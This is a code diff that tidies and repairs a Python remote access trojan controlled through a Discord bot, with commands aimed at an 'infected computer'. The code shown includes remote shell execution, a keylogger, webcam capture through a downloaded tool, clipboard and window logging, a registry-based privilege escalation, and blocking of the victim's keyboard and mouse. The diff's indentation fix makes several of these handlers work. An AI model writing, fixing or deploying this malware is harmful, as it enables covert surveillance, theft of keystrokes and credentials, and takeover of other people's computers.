@@ -5,18 +5,20 @@ import os
 import random
 import time
 import subprocess
+import socket
+import threading
+import asyncio
+import json
+import urllib.request
+from zipfile import ZipFile
 import discord
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
 from ctypes import *
-import asyncio
 from discord import utils
-import socket
-import threading
 import requests
 
-global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client(intents=discord.Intents.default())
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
@@ -27,7 +29,7 @@ Availaible commands are :
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
 --> !webcampic = Take a picture from the webcam
 --> !windowstart = Start logging current user window (logging is shown in the bot activity)
---> !windowstop = Stop logging current user window 
+--> !windowstop = Stop logging current user window
 --> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
 --> !admincheck = Check if program has admin privileges
 --> !sysinfo = Gives info about infected computer
@@ -39,7 +41,7 @@ Availaible commands are :
 --> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
---> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
+--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV
 --> !stopkeylogger = Stops keylogger
 --> !dumpkeylogger = Dumps the keylog
 --> !volumemax = Put volume at 100%
@@ -162,7 +164,7 @@ async def on_ready():
         
         await channel.send(f'{value1} | :gem:' if is_admin else value1)
     
-    game = discord.Game(f"Window logging stopped")
+    game = discord.Game("Window logging stopped")
     await client.change_presence(status=discord.Status.online, activity=game)
     
 def volumeup():
@@ -270,7 +272,7 @@ async def on_message(message):
     if message.content == "!windowstop":
         try:
             stop_threads = True
-            game = discord.Game(f"Window logging stopped")
+            game = discord.Game("Window logging stopped")
             await client.change_presence(status=discord.Status.online, activity=game)
             await message.channel.send("[*] Window logging for this session stopped")
         except Exception as e:
@@ -310,8 +312,8 @@ async def on_message(message):
             img_file = f"img_{random.randint(1000, 9999)}.png"
             
             urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", zip_file)
-            with ZipFile(zip_file) as zipObj:
-                zipObj.extractall()
+            with ZipFile(zip_file) as zip_obj:
+                zip_obj.extractall()
             
             os.system(f"WebCamImageSave.exe /capture /FileName {img_file}")
             
@@ -352,9 +354,12 @@ async def on_message(message):
             hwnd = win32gui.FindWindow(None, "Error")
             if hwnd:
                 win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
-                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
-                win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
-                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,
+                                      win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+                win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
+                                      win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+                win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,
+                                      win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                 
             await message.channel.send("[*] Message displayed")
         except Exception as e:
@@ -396,7 +401,8 @@ async def on_message(message):
                         stdin=subprocess.PIPE,
                         shell=True,
                         text=True,
-                        timeout=30
+                        timeout=30,
+                        check=False
                     )
                     return process.stdout, process.stderr
                 except subprocess.TimeoutExpired:
@@ -587,9 +593,9 @@ async def on_message(message):
             
             server = os.environ.get('logonserver', '')[2:] if 'logonserver' in os.environ else None
             
-            def if_user_is_admin(Server):
+            def if_user_is_admin(server):
                 try:
-                    groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
+                    groups = win32net.NetUserGetLocalGroups(server, os.getlogin())
                     return any(group.lower().startswith('admin') for group in groups), groups
                 except:
                     return False, []
@@ -630,7 +636,8 @@ async def on_message(message):
                         cmd = f'{cmd_exe} /k {start_cmd} "{current_script}"'
                         
                         if modify_registry(delegate_key, '') and modify_registry(None, cmd):
-                            subprocess.Popen(helper_exe, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            subprocess.Popen(helper_exe, shell=True, stdout=subprocess.PIPE,
+                                            stderr=subprocess.PIPE)
                             await message.channel.send("[*] Privilege escalation initiated")
                         else:
                             await message.channel.send("[!] Registry modification failed")
@@ -642,13 +649,11 @@ async def on_message(message):
                 await message.channel.send("[!] Current user lacks required group membership")
         except Exception as e:
             await message.channel.send("[!] Operation could not be completed")
-
     if message.content.startswith("!sing"):
         try:
             volumeup()
             from win32 import win32gui
             import win32con
-            import win32process
             
             link = message.content[6:].strip()
             
@@ -656,7 +661,8 @@ async def on_message(message):
                 if not link.startswith(("http://", "https://")):
                     link = "https://" + link
                 
-                subprocess.Popen(f'start {link}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.Popen(f'start {link}', shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE)
                 
                 def hide_youtube_window():
                     try:
@@ -684,83 +690,83 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send("[!] Media playback failed")
 
-        if message.content == "!startkeylogger":
-            import base64
-            import os
-            from pynput.keyboard import Key, Listener
-            import logging
-            temp = os.getenv("TEMP")
-            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
-                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
-            def keylog():
-                def on_press(key):
-                    logging.info(str(key))
-                with Listener(on_press=on_press) as listener:
-                    listener.join()
-            import threading
-            global test
-            test = threading.Thread(target=keylog)
-            test._running = True
-            test.daemon = True
-            test.start()
-            await message.channel.send("[*] Keylogger successfully started")
+    if message.content == "!startkeylogger":
+        import base64
+        import os
+        from pynput.keyboard import Key, Listener
+        import logging
+        temp = os.getenv("TEMP")
+        logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
+                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
+        def keylog():
+            def on_press(key):
+                logging.info(str(key))
+            with Listener(on_press=on_press) as listener:
+                listener.join()
+        import threading
+        global test
+        test = threading.Thread(target=keylog)
+        test._running = True
+        test.daemon = True
+        test.start()
+        await message.channel.send("[*] Keylogger successfully started")
 
-        if message.content == "!stopkeylogger":
-            import os
-            test._running = False
-            await message.channel.send("[*] Keylogger successfully stopped")
+    if message.content == "!stopkeylogger":
+        import os
+        test._running = False
+        await message.channel.send("[*] Keylogger successfully stopped")
 
-        if message.content == "!idletime":
-            class LASTINPUTINFO(Structure):
-                _fields_ = [
-                    ('cbSize', c_uint),
-                    ('dwTime', c_int),
-                ]
+    if message.content == "!idletime":
+        class LASTINPUTINFO(Structure):
+            _fields_ = [
+                ('cbSize', c_uint),
+                ('dwTime', c_int),
+            ]
 
-            def get_idle_duration():
-                lastInputInfo = LASTINPUTINFO()
-                lastInputInfo.cbSize = sizeof(lastInputInfo)
-                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
-                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-                    return millis / 1000.0
-                else:
-                    return 0
-            import threading
-            global idle1
-            idle1 = threading.Thread(target=get_idle_duration)
-            idle1._running = True
-            idle1.daemon = True
-            idle1.start()
-            duration = get_idle_duration()
-            await message.channel.send('User idle for %.2f seconds.' % duration)
-            import time
-            time.sleep(1)
-
-        if message.content.startswith("!voice"):
-            volumeup()
-            import comtypes
-            import win32com.client as wincl
-            speak = wincl.Dispatch("SAPI.SpVoice")
-            speak.Speak(message.content[7:])
-            comtypes.CoUninitialize()
-            await  message.channel.send("[*] Command successfully executed")
-
-        if message.content.startswith("!blockinput"):
-            import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                ok = windll.user32.BlockInput(True)
-                await message.channel.send("[*] Command successfully executed")
+        def get_idle_duration():
+            lastInputInfo = LASTINPUTINFO()
+            lastInputInfo.cbSize = sizeof(lastInputInfo)
+            if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
+                millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
+                return millis / 1000.0
             else:
-                await message.channel.send("[!] Admin rights are required for this operation")
+                return 0
+        import threading
+        global idle1
+        idle1 = threading.Thread(target=get_idle_duration)
+        idle1._running = True
+        idle1.daemon = True
+        idle1.start()
+        duration = get_idle_duration()
+        await message.channel.send('User idle for %.2f seconds.' % duration)
+        import time
+        time.sleep(1)
 
-        if message.content.startswith("!unblockinput"):
-            import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
-                ok = windll.user32.BlockInput(False)
-                await  message.channel.send("[*] Command successfully executed")
-            else:
-                await message.channel.send("[!] Admin rights are required for this operation")
+    if message.content.startswith("!voice"):
+        volumeup()
+        import comtypes
+        import win32com.client as wincl
+        speak = wincl.Dispatch("SAPI.SpVoice")
+        speak.Speak(message.content[7:])
+        comtypes.CoUninitialize()
+        await message.channel.send("[*] Command successfully executed")
+
+    if message.content.startswith("!blockinput"):
+        import ctypes
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin is True:
+            ok = windll.user32.BlockInput(True)
+            await message.channel.send("[*] Command successfully executed")
+        else:
+            await message.channel.send("[!] Admin rights are required for this operation")
+
+    if message.content.startswith("!unblockinput"):
+        import ctypes
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin is True:
+            ok = windll.user32.BlockInput(False)
+            await message.channel.send("[*] Command successfully executed")
+        else:
+            await message.channel.send("[!] Admin rights are required for this operation")
 
 client.run(token)
